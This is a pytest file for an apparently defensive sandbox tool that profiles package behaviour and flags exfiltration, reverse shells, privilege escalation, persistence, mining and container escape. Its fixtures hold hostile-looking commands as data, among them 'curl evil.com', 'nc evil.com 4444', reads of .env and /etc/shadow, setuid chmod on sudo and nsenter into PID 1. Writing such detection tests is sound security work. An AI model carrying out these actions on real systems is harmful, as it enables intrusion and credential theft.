"""Tests for L4 behavioral analysis."""

from picosentry.sandbox.l3.engine import sandbox_run
from picosentry.sandbox.l4.baseline import load_all_baselines, load_baseline
from picosentry.sandbox.l4.differ import compare_profile_to_baseline
from picosentry.sandbox.l4.engine import create_default_engine
from picosentry.sandbox.l4.models import (
    Baseline,
    BehavioralProfile,
    BehavioralVerdict,
    DnsQuery,
    FileOperation,
    NetworkCall,
    ProcessSpawn,
)
from picosentry.sandbox.l4.profiler import profile_from_sandbox_result


class TestProfiler:
    def test_profile_from_clean_result(self):
        result = sandbox_run(["echo", "hello"], allow_degraded=True)
        profile = profile_from_sandbox_result(result)
        assert profile.package is not None
        assert profile.exit_code == 0

    def test_profile_has_no_network_on_clean_cmd(self):
        result = sandbox_run(["echo", "clean"], allow_degraded=True)
        profile = profile_from_sandbox_result(result)
        assert len(profile.network_calls) == 0


class TestBaselines:
    def test_load_all_baselines(self):
        baselines = load_all_baselines()
        assert "npm-install" in baselines
        assert "python-script" in baselines

    def test_baseline_has_expected_fields(self):
        # Use a local baseline to avoid global state mutation from other tests
        baseline = Baseline(
            name="python-script",
            package="python",
            expected_network_calls=0,
            expected_dns_queries=0,
            expected_fs_ops=100,
            expected_spawns=0,
            expected_runtime_ms_range=(10, 30000),
            allowed_domains=[],
            allowed_paths=["**"],
        )
        assert baseline.package == "python"
        assert baseline.expected_network_calls == 0

    def test_baseline_missing_returns_none(self):
        assert load_baseline("nonexistent-baseline") is None


class TestDiffer:
    def test_clean_profile_matches_baseline(self):
        profile = BehavioralProfile(
            package="python",
            network_calls=[],
            dns_queries=[],
            fs_ops=[],
            spawns=[],
            total_runtime_ms=50,
        )
        baseline = Baseline(
            name="python-script",
            package="python",
            expected_network_calls=0,
            expected_dns_queries=0,
            expected_fs_ops=100,
            expected_spawns=0,
            expected_runtime_ms_range=(10, 30000),
            allowed_domains=[],
            allowed_paths=["**"],
        )
        drift = compare_profile_to_baseline(profile, baseline)
        assert drift.score == 0.0
        assert not drift.network_drift

    def test_network_drift_detected(self):
        profile = BehavioralProfile(
            package="python",
            network_calls=[NetworkCall(address="evil.com", port=1337)],
            dns_queries=[],
            fs_ops=[],
            spawns=[],
            total_runtime_ms=50,
        )
        baseline = Baseline(
            name="python-script",
            package="python",
            expected_network_calls=0,
            expected_dns_queries=0,
            expected_fs_ops=100,
            expected_spawns=0,
            expected_runtime_ms_range=(10, 30000),
            allowed_domains=[],
            allowed_paths=["**"],
        )
        drift = compare_profile_to_baseline(profile, baseline)
        assert drift.network_drift
        assert drift.score > 0.0

    def test_timing_drift_detected(self):
        profile = BehavioralProfile(
            package="python",
            network_calls=[],
            dns_queries=[],
            fs_ops=[],
            spawns=[],
            total_runtime_ms=99999,
        )
        baseline = Baseline(
            name="python-script",
            package="python",
            expected_network_calls=0,
            expected_dns_queries=0,
            expected_fs_ops=100,
            expected_spawns=0,
            expected_runtime_ms_range=(10, 30000),
            allowed_domains=[],
            allowed_paths=["**"],
        )
        drift = compare_profile_to_baseline(profile, baseline)
        assert drift.timing_drift
        assert drift.score > 0.0


class TestL4Engine:
    def test_engine_analyzes_clean_profile(self):
        profile = BehavioralProfile(
            package="python",
            total_runtime_ms=100,
        )
        result = create_default_engine().analyze(profile)
        assert result.overall_verdict == BehavioralVerdict.CLEAN

    def test_engine_detects_exfiltration(self):
        profile = BehavioralProfile(
            package="python",
            network_calls=[NetworkCall(address="evil.xyz", port=4444)],
            dns_queries=[DnsQuery(hostname="evil.xyz")],
            fs_ops=[
                FileOperation(path="/home/user/.env", operation="read"),
                FileOperation(path="secrets.json", operation="read"),
            ],
            total_runtime_ms=100,
        )
        result = create_default_engine().analyze(profile)
        assert result.overall_verdict == BehavioralVerdict.MALICIOUS
        assert any(f.rule_id == "L4-EXFIL-005" for f in result.findings)

    def test_engine_detects_honeypot(self):
        profile = BehavioralProfile(
            package="node",
            fs_ops=[FileOperation(path="/etc/passwd", operation="read")],
            total_runtime_ms=100,
        )
        result = create_default_engine().analyze(profile)
        assert result.overall_verdict == BehavioralVerdict.MALICIOUS

    def test_engine_list_rules(self):
        engine = create_default_engine()
        rules = engine.list_rules()
        assert "L4-TIME" in rules
        assert "L4-EXFIL" in rules
        assert "L4-ENTROPY" in rules
        assert "L4-HONEY" in rules
        assert "L4-BASE" in rules
        assert "L4-ENV" in rules
        assert "L4-PROC" in rules
        assert "L4-FS" in rules
        assert "L4-NET" in rules
        assert "L4-SC" in rules

    def test_engine_subset_rules(self):
        profile = BehavioralProfile(package="python", total_runtime_ms=100)
        result = create_default_engine().analyze(profile, rules=["L4-HONEY"])
        assert result.overall_verdict == BehavioralVerdict.CLEAN


class TestEndToEnd:
    def test_l3_to_l4_pipeline(self):
        """Full L3+L4 pipeline: sandbox a command, then analyze behavior."""
        # L3: run a safe command
        sandbox = sandbox_run(["echo", "pipeline_test"], allow_degraded=True)
        assert sandbox.overall_verdict.value == "ALLOW"

        # L4: profile and analyze
        profile = profile_from_sandbox_result(sandbox)
        # The profile may trigger timing/baseline findings depending on runtime
        # environment, so we just verify the pipeline runs end-to-end
        result = create_default_engine().analyze(profile)
        assert result.overall_verdict in (BehavioralVerdict.CLEAN, BehavioralVerdict.SUSPICIOUS)
        # Key invariant: L3 sandbox must report ALLOW for a simple echo
        assert sandbox.exit_code == 0

    def test_suspicious_pipeline(self):
        """Suspicious command should trigger L3+L4 findings."""
        sandbox = sandbox_run(
            [
                "python3",
                "-c",
                "print('connect 192.168.1.100:1337'); print('reading /etc/passwd'); print('eval(compile(bad))')",
            ],
            allow_degraded=True,
        )
        profile = profile_from_sandbox_result(sandbox)
        result = create_default_engine().analyze(profile)
        assert result.overall_verdict in (BehavioralVerdict.SUSPICIOUS, BehavioralVerdict.MALICIOUS)
        assert len(result.findings) > 0


class TestL4EnvLeak:
    def test_env_leak_detects_dotenv_access(self):
        from picosentry.sandbox.l4.rules.env_leak import detect_env_leak

        profile = BehavioralProfile(
            package="evil-pkg",
            fs_ops=[FileOperation(path=".env", operation="read")],
            network_calls=[],
            dns_queries=[],
            spawns=[],
            total_runtime_ms=100,
        )
        findings = detect_env_leak(profile)
        assert any(f.rule_id == "L4-ENV-001" for f in findings)

    def test_env_leak_detects_env_dump_command(self):
        from picosentry.sandbox.l4.rules.env_leak import detect_env_leak

        profile = BehavioralProfile(
            package="evil-pkg",
            fs_ops=[],
            network_calls=[],
            dns_queries=[],
            spawns=[ProcessSpawn(executable="/usr/bin/env", args=["env"])],
            total_runtime_ms=100,
        )
        findings = detect_env_leak(profile)
        assert any(f.rule_id == "L4-ENV-003" for f in findings)

    def test_env_leak_clean_profile(self):
        from picosentry.sandbox.l4.rules.env_leak import detect_env_leak

        profile = BehavioralProfile(package="clean-pkg", total_runtime_ms=100)
        findings = detect_env_leak(profile)
        assert len(findings) == 0


class TestL4ProcessAnomaly:
    def test_detects_shell_spawn(self):
        from picosentry.sandbox.l4.rules.process_anomaly import detect_process_anomalies

        profile = BehavioralProfile(
            package="evil-pkg",
            spawns=[ProcessSpawn(executable="/bin/bash", args=["-c", "curl evil.com"])],
            total_runtime_ms=100,
        )
        findings = detect_process_anomalies(profile)
        assert any(f.rule_id == "L4-PROC-001" for f in findings)

    def test_detects_reverse_shell_tool(self):
        from picosentry.sandbox.l4.rules.process_anomaly import detect_process_anomalies

        profile = BehavioralProfile(
            package="evil-pkg",
            spawns=[ProcessSpawn(executable="/usr/bin/nc", args=["evil.com", "4444"])],
            total_runtime_ms=100,
        )
        findings = detect_process_anomalies(profile)
        assert any(f.rule_id == "L4-PROC-002" for f in findings)

    def test_detects_excessive_spawns(self):
        from picosentry.sandbox.l4.rules.process_anomaly import detect_process_anomalies

        # >10 is the anomaly bar (WO4.0.0-018): npm/pip installs routinely
        # spawn 6+ helpers; the old >5 threshold flagged every big install.
        spawns = [ProcessSpawn(executable=f"/usr/bin/cmd{i}", args=[]) for i in range(11)]
        profile = BehavioralProfile(
            package="suspicious-pkg",
            spawns=spawns,
            total_runtime_ms=100,
        )
        findings = detect_process_anomalies(profile)
        assert any(f.rule_id == "L4-PROC-003" for f in findings)

    def test_ten_spawns_is_within_normal_install_range(self):
        from picosentry.sandbox.l4.rules.process_anomaly import detect_process_anomalies

        spawns = [ProcessSpawn(executable=f"/usr/bin/cmd{i}", args=[]) for i in range(10)]
        profile = BehavioralProfile(
            package="benign-pkg",
            spawns=spawns,
            total_runtime_ms=100,
        )
        findings = detect_process_anomalies(profile)
        assert not any(f.rule_id == "L4-PROC-003" for f in findings)

    def test_clean_profile_no_findings(self):
        from picosentry.sandbox.l4.rules.process_anomaly import detect_process_anomalies

        profile = BehavioralProfile(package="clean-pkg", total_runtime_ms=100)
        findings = detect_process_anomalies(profile)
        assert len(findings) == 0


class TestL4FilesystemAnomaly:
    def test_detects_protected_path_write(self):
        from picosentry.sandbox.l4.rules.filesystem import detect_filesystem_anomalies

        profile = BehavioralProfile(
            package="evil-pkg",
            fs_ops=[FileOperation(path="/etc/passwd", operation="write")],
            total_runtime_ms=100,
        )
        findings = detect_filesystem_anomalies(profile)
        assert any(f.rule_id == "L4-FS-001" for f in findings)

    def test_detects_path_traversal(self):
        from picosentry.sandbox.l4.rules.filesystem import detect_filesystem_anomalies

        profile = BehavioralProfile(
            package="evil-pkg",
            fs_ops=[FileOperation(path="../../etc/shadow", operation="read")],
            total_runtime_ms=100,
        )
        findings = detect_filesystem_anomalies(profile)
        assert any(f.rule_id == "L4-FS-004" for f in findings)

    def test_detects_critical_file_deletion(self):
        from picosentry.sandbox.l4.rules.filesystem import detect_filesystem_anomalies

        profile = BehavioralProfile(
            package="evil-pkg",
            fs_ops=[FileOperation(path="/etc/passwd", operation="delete")],
            total_runtime_ms=100,
        )
        findings = detect_filesystem_anomalies(profile)
        assert any(f.rule_id == "L4-FS-003" for f in findings)

    def test_clean_profile_no_findings(self):
        from picosentry.sandbox.l4.rules.filesystem import detect_filesystem_anomalies

        profile = BehavioralProfile(package="clean-pkg", total_runtime_ms=100)
        findings = detect_filesystem_anomalies(profile)
        assert len(findings) == 0


class TestL4NetworkAnomaly:
    def test_detects_suspicious_port(self):
        from picosentry.sandbox.l4.rules.network import detect_network_anomalies

        profile = BehavioralProfile(
            package="evil-pkg",
            network_calls=[NetworkCall(address="evil.com", port=4444)],
            dns_queries=[],
            total_runtime_ms=100,
        )
        findings = detect_network_anomalies(profile)
        assert any(f.rule_id == "L4-NET-001" for f in findings)

    def test_detects_suspicious_tld(self):
        from picosentry.sandbox.l4.rules.network import detect_network_anomalies

        profile = BehavioralProfile(
            package="evil-pkg",
            network_calls=[],
            dns_queries=[DnsQuery(hostname="evil.xyz")],
            total_runtime_ms=100,
        )
        findings = detect_network_anomalies(profile)
        assert any(f.rule_id == "L4-NET-003" for f in findings)

    def test_clean_profile_no_findings(self):
        from picosentry.sandbox.l4.rules.network import detect_network_anomalies

        profile = BehavioralProfile(package="clean-pkg", total_runtime_ms=100)
        findings = detect_network_anomalies(profile)
        assert len(findings) == 0


class TestL4SupplyChain:
    def test_detects_dns_query_to_suspicious_host(self):
        from picosentry.sandbox.l4.rules.supply_chain import detect_supply_chain_patterns

        profile = BehavioralProfile(
            package="evil-pkg",
            network_calls=[],
            dns_queries=[DnsQuery(hostname="pastebin.com")],
            total_runtime_ms=100,
        )
        findings = detect_supply_chain_patterns(profile)
        assert any(f.rule_id == "L4-SC-005" for f in findings)

    def test_clean_profile_no_findings(self):
        from picosentry.sandbox.l4.rules.supply_chain import detect_supply_chain_patterns

        profile = BehavioralProfile(package="clean-pkg", total_runtime_ms=100)
        findings = detect_supply_chain_patterns(profile)
        assert len(findings) == 0


class TestL4PrivilegeEscalation:
    def test_detects_sudoers_write(self):
        from picosentry.sandbox.l4.rules.privilege_escalation import detect_privilege_escalation

        profile = BehavioralProfile(
            package="evil-pkg",
            fs_ops=[FileOperation(path="/etc/sudoers", operation="write")],
            total_runtime_ms=100,
        )
        findings = detect_privilege_escalation(profile)
        assert any(f.rule_id == "L4-PRIVESC-001" for f in findings)

    def test_detects_shadow_write(self):
        from picosentry.sandbox.l4.rules.privilege_escalation import detect_privilege_escalation

        profile = BehavioralProfile(
            package="evil-pkg",
            fs_ops=[FileOperation(path="/etc/shadow", operation="write")],
            total_runtime_ms=100,
        )
        findings = detect_privilege_escalation(profile)
        assert any(f.rule_id == "L4-PRIVESC-001" for f in findings)

    def test_detects_sudo_spawn(self):
        from picosentry.sandbox.l4.rules.privilege_escalation import detect_privilege_escalation

        profile = BehavioralProfile(
            package="evil-pkg",
            spawns=[ProcessSpawn(executable="/usr/bin/sudo", args=["bash"])],
            total_runtime_ms=100,
        )
        findings = detect_privilege_escalation(profile)
        assert any(f.rule_id == "L4-PRIVESC-002" for f in findings)

    def test_detects_setuid_chmod(self):
        from picosentry.sandbox.l4.rules.privilege_escalation import detect_privilege_escalation

        # WO9.0.0-002: the old version of this test used the path shape
        # "chmod 4755 /usr/bin/custom" — a command string in the path field,
        # which no backend produces. The rule matched command prefixes against
        # op.path, so it fired on that fake shape and never on real data.
        # The mode is the real signal.
        profile = BehavioralProfile(
            package="evil-pkg",
            fs_ops=[FileOperation(path="/usr/bin/custom", operation="chmod", mode="4755")],
            total_runtime_ms=100,
        )
        findings = detect_privilege_escalation(profile)
        assert any(f.rule_id == "L4-PRIVESC-003" for f in findings)

    def test_detects_capabilities_manipulation(self):
        from picosentry.sandbox.l4.rules.privilege_escalation import detect_privilege_escalation

        profile = BehavioralProfile(
            package="evil-pkg",
            spawns=[ProcessSpawn(executable="/usr/sbin/setcap", args=["cap_setuid+ep", "/usr/bin/python3"])],
            total_runtime_ms=100,
        )
        findings = detect_privilege_escalation(profile)
        assert any(f.rule_id == "L4-PRIVESC-004" for f in findings)

    def test_detects_cron_manipulation(self):
        from picosentry.sandbox.l4.rules.privilege_escalation import detect_privilege_escalation

        profile = BehavioralProfile(
            package="evil-pkg",
            fs_ops=[FileOperation(path="/etc/cron.d/malicious", operation="create")],
            total_runtime_ms=100,
        )
        findings = detect_privilege_escalation(profile)
        assert any(f.rule_id == "L4-PRIVESC-005" for f in findings)

    def test_clean_profile_no_findings(self):
        from picosentry.sandbox.l4.rules.privilege_escalation import detect_privilege_escalation

        profile = BehavioralProfile(package="clean-pkg", total_runtime_ms=100)
        findings = detect_privilege_escalation(profile)
        assert len(findings) == 0


class TestL4Persistence:
    def test_detects_authorized_keys_write(self):
        from picosentry.sandbox.l4.rules.persistence import detect_persistence

        profile = BehavioralProfile(
            package="evil-pkg",
            fs_ops=[FileOperation(path="/home/user/.ssh/authorized_keys", operation="write")],
            total_runtime_ms=100,
        )
        findings = detect_persistence(profile)
        assert any(f.rule_id == "L4-PERSIST-001" for f in findings)

    def test_detects_systemd_unit_creation(self):
        from picosentry.sandbox.l4.rules.persistence import detect_persistence

        profile = BehavioralProfile(
            package="evil-pkg",
            fs_ops=[FileOperation(path="/etc/systemd/system/evil.service", operation="create")],
            total_runtime_ms=100,
        )
        findings = detect_persistence(profile)
        assert any(f.rule_id == "L4-PERSIST-001" for f in findings)

    def test_detects_crontab_spawn(self):
        from picosentry.sandbox.l4.rules.persistence import detect_persistence

        profile = BehavioralProfile(
            package="evil-pkg",
            spawns=[ProcessSpawn(executable="/usr/bin/crontab", args=["-l"])],
            total_runtime_ms=100,
        )
        findings = detect_persistence(profile)
        assert any(f.rule_id == "L4-PERSIST-002" for f in findings)

    def test_detects_systemctl_enable(self):
        from picosentry.sandbox.l4.rules.persistence import detect_persistence

        profile = BehavioralProfile(
            package="evil-pkg",
            spawns=[ProcessSpawn(executable="/usr/bin/systemctl", args=["enable", "evil.service"])],
            total_runtime_ms=100,
        )
        findings = detect_persistence(profile)
        assert any(f.rule_id == "L4-PERSIST-003" for f in findings)

    def test_detects_launchctl_load(self):
        from picosentry.sandbox.l4.rules.persistence import detect_persistence

        profile = BehavioralProfile(
            package="evil-pkg",
            spawns=[ProcessSpawn(executable="/bin/launchctl", args=["load", "-w", "/Library/LaunchAgents/evil.plist"])],
            total_runtime_ms=100,
        )
        findings = detect_persistence(profile)
        assert any(f.rule_id == "L4-PERSIST-005" for f in findings)

    def test_clean_profile_no_findings(self):
        from picosentry.sandbox.l4.rules.persistence import detect_persistence

        profile = BehavioralProfile(package="clean-pkg", total_runtime_ms=100)
        findings = detect_persistence(profile)
        assert len(findings) == 0


class TestL4CryptoMining:
    def test_detects_mining_pool_port(self):
        from picosentry.sandbox.l4.rules.crypto_mining import detect_crypto_mining

        profile = BehavioralProfile(
            package="evil-pkg",
            network_calls=[NetworkCall(address="pool.minexmr.com", port=3333)],
            dns_queries=[],
            total_runtime_ms=100,
        )
        findings = detect_crypto_mining(profile)
        assert any(f.rule_id == "L4-CRYPTO-001" for f in findings)

    def test_detects_xmrig_spawn(self):
        from picosentry.sandbox.l4.rules.crypto_mining import detect_crypto_mining

        profile = BehavioralProfile(
            package="evil-pkg",
            spawns=[ProcessSpawn(executable="/usr/bin/xmrig", args=["--url=stratum+tcp://pool:3333"])],
            total_runtime_ms=100,
        )
        findings = detect_crypto_mining(profile)
        assert any(f.rule_id == "L4-CRYPTO-002" for f in findings)

    def test_detects_mining_dns(self):
        from picosentry.sandbox.l4.rules.crypto_mining import detect_crypto_mining

        profile = BehavioralProfile(
            package="evil-pkg",
            dns_queries=[DnsQuery(hostname="pool.monero.crypto")],
            total_runtime_ms=100,
        )
        findings = detect_crypto_mining(profile)
        assert any(f.rule_id == "L4-CRYPTO-003" for f in findings)

    def test_detects_mining_config_access(self):
        from picosentry.sandbox.l4.rules.crypto_mining import detect_crypto_mining

        profile = BehavioralProfile(
            package="evil-pkg",
            fs_ops=[FileOperation(path="/home/user/.xmrig/config.json", operation="read")],
            total_runtime_ms=100,
        )
        findings = detect_crypto_mining(profile)
        assert any(f.rule_id == "L4-CRYPTO-005" for f in findings)

    def test_detects_mining_arguments(self):
        from picosentry.sandbox.l4.rules.crypto_mining import detect_crypto_mining

        profile = BehavioralProfile(
            package="evil-pkg",
            spawns=[ProcessSpawn(executable="/usr/bin/unknown-miner", args=["--url=stratum+tcp://pool:3333"])],
            total_runtime_ms=100,
        )
        findings = detect_crypto_mining(profile)
        assert any(f.rule_id == "L4-CRYPTO-006" for f in findings)

    def test_clean_profile_no_findings(self):
        from picosentry.sandbox.l4.rules.crypto_mining import detect_crypto_mining

        profile = BehavioralProfile(package="clean-pkg", total_runtime_ms=100)
        findings = detect_crypto_mining(profile)
        assert len(findings) == 0


class TestL4ContainerEscape:
    def test_detects_proc1_access(self):
        from picosentry.sandbox.l4.rules.container_escape import detect_container_escape

        profile = BehavioralProfile(
            package="evil-pkg",
            fs_ops=[FileOperation(path="/proc/1/cgroup", operation="read")],
            total_runtime_ms=100,
        )
        findings = detect_container_escape(profile)
        assert any(f.rule_id == "L4-CONTAINER-001" for f in findings)

    def test_detects_docker_sock_access(self):
        from picosentry.sandbox.l4.rules.container_escape import detect_container_escape

        profile = BehavioralProfile(
            package="evil-pkg",
            fs_ops=[FileOperation(path="/var/run/docker.sock", operation="read")],
            total_runtime_ms=100,
        )
        findings = detect_container_escape(profile)
        assert any(f.rule_id == "L4-CONTAINER-001" for f in findings)

    def test_detects_docker_spawn(self):
        from picosentry.sandbox.l4.rules.container_escape import detect_container_escape

        profile = BehavioralProfile(
            package="evil-pkg",
            spawns=[ProcessSpawn(executable="/usr/bin/docker", args=["run", "-it", "ubuntu"])],
            total_runtime_ms=100,
        )
        findings = detect_container_escape(profile)
        assert any(f.rule_id == "L4-CONTAINER-002" for f in findings)

    def test_detects_cloud_metadata_access(self):
        from picosentry.sandbox.l4.rules.container_escape import detect_container_escape

        profile = BehavioralProfile(
            package="evil-pkg",
            network_calls=[NetworkCall(address="169.254.169.254", port=80)],
            dns_queries=[],
            total_runtime_ms=100,
        )
        findings = detect_container_escape(profile)
        assert any(f.rule_id == "L4-CONTAINER-003" for f in findings)

    def test_detects_proc_self_mountinfo(self):
        from picosentry.sandbox.l4.rules.container_escape import detect_container_escape

        profile = BehavioralProfile(
            package="evil-pkg",
            fs_ops=[FileOperation(path="/proc/self/mountinfo", operation="read")],
            total_runtime_ms=100,
        )
        findings = detect_container_escape(profile)
        assert any(f.rule_id == "L4-CONTAINER-004" for f in findings)

    def test_detects_nsenter_spawn(self):
        from picosentry.sandbox.l4.rules.container_escape import detect_container_escape

        profile = BehavioralProfile(
            package="evil-pkg",
            spawns=[ProcessSpawn(executable="/usr/bin/nsenter", args=["-t", "1", "-m", "-u", "-i", "-n", "/bin/bash"])],
            total_runtime_ms=100,
        )
        findings = detect_container_escape(profile)
        assert any(f.rule_id == "L4-CONTAINER-005" for f in findings)

    def test_detects_cloud_metadata_dns(self):
        from picosentry.sandbox.l4.rules.container_escape import detect_container_escape

        profile = BehavioralProfile(
            package="evil-pkg",
            dns_queries=[DnsQuery(hostname="metadata.google.internal")],
            total_runtime_ms=100,
        )
        findings = detect_container_escape(profile)
        assert any(f.rule_id == "L4-CONTAINER-006" for f in findings)

    def test_clean_profile_no_findings(self):
        from picosentry.sandbox.l4.rules.container_escape import detect_container_escape

        profile = BehavioralProfile(package="clean-pkg", total_runtime_ms=100)
        findings = detect_container_escape(profile)
        assert len(findings) == 0


class TestL4DependencyConfusion:
    def test_detects_internal_registry_dns(self):
        from picosentry.sandbox.l4.rules.dependency_confusion import detect_dependency_confusion

        profile = BehavioralProfile(
            package="evil-pkg",
            dns_queries=[DnsQuery(hostname="npm.internal.company.com")],
            total_runtime_ms=100,
        )
        findings = detect_dependency_confusion(profile)
        assert any(f.rule_id == "L4-DEP-001" for f in findings)

    def test_detects_local_tld(self):
        from picosentry.sandbox.l4.rules.dependency_confusion import detect_dependency_confusion

        profile = BehavioralProfile(
            package="evil-pkg",
            dns_queries=[DnsQuery(hostname="myregistry.local")],
            total_runtime_ms=100,
        )
        findings = detect_dependency_confusion(profile)
        assert any(f.rule_id == "L4-DEP-001" for f in findings)

    def test_detects_npm_publish(self):
        from picosentry.sandbox.l4.rules.dependency_confusion import detect_dependency_confusion

        profile = BehavioralProfile(
            package="evil-pkg",
            spawns=[ProcessSpawn(executable="/usr/bin/npm", args=["publish"])],
            total_runtime_ms=100,
        )
        findings = detect_dependency_confusion(profile)
        assert any(f.rule_id == "L4-DEP-002" for f in findings)

    def test_detects_twine_upload(self):
        from picosentry.sandbox.l4.rules.dependency_confusion import detect_dependency_confusion

        profile = BehavioralProfile(
            package="evil-pkg",
            spawns=[ProcessSpawn(executable="/usr/bin/twine", args=["upload", "dist/*"])],
            total_runtime_ms=100,
        )
        findings = detect_dependency_confusion(profile)
        assert any(f.rule_id == "L4-DEP-002" for f in findings)

    def test_detects_suspicious_pip_index_url(self):
        from picosentry.sandbox.l4.rules.dependency_confusion import detect_dependency_confusion

        profile = BehavioralProfile(
            package="evil-pkg",
            spawns=[
                ProcessSpawn(
                    executable="/usr/bin/pip",
                    args=["install", "--index-url=http://evil.com/simple", "pkg"],
                ),
            ],
            total_runtime_ms=100,
        )
        findings = detect_dependency_confusion(profile)
        assert any(f.rule_id == "L4-DEP-003" for f in findings)

    def test_detects_registry_override(self):
        from picosentry.sandbox.l4.rules.dependency_confusion import detect_dependency_confusion

        profile = BehavioralProfile(
            package="evil-pkg",
            spawns=[
                ProcessSpawn(
                    executable="/usr/bin/pip",
                    args=["install", "--extra-index-url=http://evil.com/simple", "pkg"],
                ),
            ],
            total_runtime_ms=100,
        )
        findings = detect_dependency_confusion(profile)
        assert any(f.rule_id == "L4-DEP-004" for f in findings)

    def test_detects_npmrc_write(self):
        from picosentry.sandbox.l4.rules.dependency_confusion import detect_dependency_confusion

        profile = BehavioralProfile(
            package="evil-pkg",
            fs_ops=[FileOperation(path="/home/user/.npmrc", operation="write")],
            total_runtime_ms=100,
        )
        findings = detect_dependency_confusion(profile)
        assert any(f.rule_id == "L4-DEP-006" for f in findings)
        # Write should be HIGH severity
        npmrc_finding = next(f for f in findings if f.rule_id == "L4-DEP-006")
        assert npmrc_finding.severity.value == "HIGH"

    def test_clean_profile_no_findings(self):
        from picosentry.sandbox.l4.rules.dependency_confusion import detect_dependency_confusion

        profile = BehavioralProfile(package="clean-pkg", total_runtime_ms=100)
        findings = detect_dependency_confusion(profile)
        assert len(findings) == 0


class TestSetuidChmodDetection:
    """WO9.0.0-002: L4-PRIVESC-003 (setuid/setgid chmod) was dead.

    The rule matched SETUID_PATTERNS ("chmod 4", "chmod 47", ...) against
    `op.path`, but op.path is a FILE PATH, not a command string. The mode
    lives in the mode argument of the chmod call, which the profiler threw
    away. So the rule could never fire on real data — a postinstall script
    doing `chmod 4755 /usr/bin/sudo` was invisible.

    The existing test_detects_setuid_chmod used the fake path shape
    ("chmod 4755 /usr/bin/custom") that no backend ever produces, so it
    passed while the real case was missed.
    """

    def _findings(self, fs_ops):
        from picosentry.sandbox.l4.rules.privilege_escalation import detect_privilege_escalation

        profile = BehavioralProfile(package="evil-pkg", fs_ops=fs_ops, total_runtime_ms=100)
        return detect_privilege_escalation(profile)

    def test_setuid_mode_on_real_path_is_detected(self):
        findings = self._findings([FileOperation(path="/usr/bin/sudo", operation="chmod", mode="4755")])
        assert any(f.rule_id == "L4-PRIVESC-003" for f in findings), (
            "a chmod with a setuid mode must raise L4-PRIVESC-003"
        )

    def test_setgid_mode_is_detected(self):
        findings = self._findings([FileOperation(path="/usr/bin/wall", operation="chmod", mode="6755")])
        assert any(f.rule_id == "L4-PRIVESC-003" for f in findings)

    def test_setuid_bit_only_mode_is_detected(self):
        findings = self._findings([FileOperation(path="/tmp/x", operation="chmod", mode="4755")])
        assert any(f.rule_id == "L4-PRIVESC-003" for f in findings)

    def test_ordinary_chmod_is_not_flagged(self):
        findings = self._findings([FileOperation(path="/usr/local/bin/tool", operation="chmod", mode="755")])
        assert not any(f.rule_id == "L4-PRIVESC-003" for f in findings), (
            "a plain 755 chmod must not raise a CRITICAL setuid finding"
        )

    def test_world_writable_chmod_is_not_setuid(self):
        findings = self._findings([FileOperation(path="/tmp/x", operation="chmod", mode="777")])
        assert not any(f.rule_id == "L4-PRIVESC-003" for f in findings)

    def test_chmod_without_mode_is_not_flagged(self):
        """No mode means no setuid evidence — do not guess."""
        findings = self._findings([FileOperation(path="/usr/bin/sudo", operation="chmod")])
        assert not any(f.rule_id == "L4-PRIVESC-003" for f in findings)


class TestChmodModeIsProfiled:
    """The profiler must carry the chmod MODE, not just the path — the mode is
    the only thing that distinguishes a setuid chmod from an ordinary one."""

    def test_chmod_mode_is_captured_from_stdout(self):
        from picosentry.sandbox.l4.profiler import _extract_file_operations

        ops = _extract_file_operations("chmod 4755 /usr/bin/sudo")
        chmod_ops = [o for o in ops if o.operation == "chmod"]
        assert chmod_ops, "chmod operation not extracted"
        assert chmod_ops[0].path == "/usr/bin/sudo"
        assert chmod_ops[0].mode == "4755", f"mode not captured: {chmod_ops[0].mode!r}"

    def test_ordinary_chmod_mode_is_captured(self):
        from picosentry.sandbox.l4.profiler import _extract_file_operations

        ops = _extract_file_operations("chmod 755 /usr/local/bin/tool")
        chmod_ops = [o for o in ops if o.operation == "chmod"]
        assert chmod_ops[0].mode == "755"

    def test_symbolic_mode_is_captured(self):
        from picosentry.sandbox.l4.profiler import _extract_file_operations

        ops = _extract_file_operations("chmod +x /usr/local/bin/tool")
        chmod_ops = [o for o in ops if o.operation == "chmod"]
        assert chmod_ops[0].mode == "+x"

    def test_profiled_chmod_produces_setuid_finding(self):
        """End-to-end: stdout -> profile -> rule."""
        from picosentry.sandbox.l4.profiler import _extract_file_operations
        from picosentry.sandbox.l4.rules.privilege_escalation import detect_privilege_escalation

        ops = _extract_file_operations("chmod 4755 /usr/bin/sudo")
        profile = BehavioralProfile(package="evil-pkg", fs_ops=ops, total_runtime_ms=100)
        findings = detect_privilege_escalation(profile)
        assert any(f.rule_id == "L4-PRIVESC-003" for f in findings), (
            "the profiled chmod must reach the rule and be detected"
        )


class TestChmodModeFromEvents:
    """The event path must carry the mode too, so a backend that reports
    file_chmod events feeds the same rule as the stdout path."""

    def _op(self, detail):
        from picosentry.sandbox.l3.models import SandboxEvent, Verdict
        from picosentry.sandbox.l4.profiler import _extract_fs_from_events

        ev = SandboxEvent(
            rule_id="L3-TEST",
            verdict=Verdict.ALLOW,
            operation="file_chmod",
            detail=detail,
            path="/usr/bin/sudo",
        )
        ops = _extract_fs_from_events([ev])
        return ops[0] if ops else None

    def test_chmod_command_detail_yields_mode(self):
        op = self._op("chmod 4755 /usr/bin/sudo")
        assert op is not None and op.mode == "4755", f"mode not extracted: {op}"

    def test_mode_keyword_detail_yields_mode(self):
        op = self._op("mode=6755")
        assert op is not None and op.mode == "6755", f"mode not extracted: {op}"

    def test_bare_numeric_detail_yields_mode(self):
        op = self._op("4755")
        assert op is not None and op.mode == "4755", f"mode not extracted: {op}"

    def test_detail_without_mode_yields_empty_mode(self):
        op = self._op("chmod performed")
        assert op is not None and op.mode == "", f"mode should be empty, got {op.mode!r}"

    def test_event_chmod_reaches_the_rule(self):
        from picosentry.sandbox.l4.rules.privilege_escalation import detect_privilege_escalation

        op = self._op("chmod 4755 /usr/bin/sudo")
        profile = BehavioralProfile(package="evil-pkg", fs_ops=[op], total_runtime_ms=100)
        findings = detect_privilege_escalation(profile)
        assert any(f.rule_id == "L4-PRIVESC-003" for f in findings)
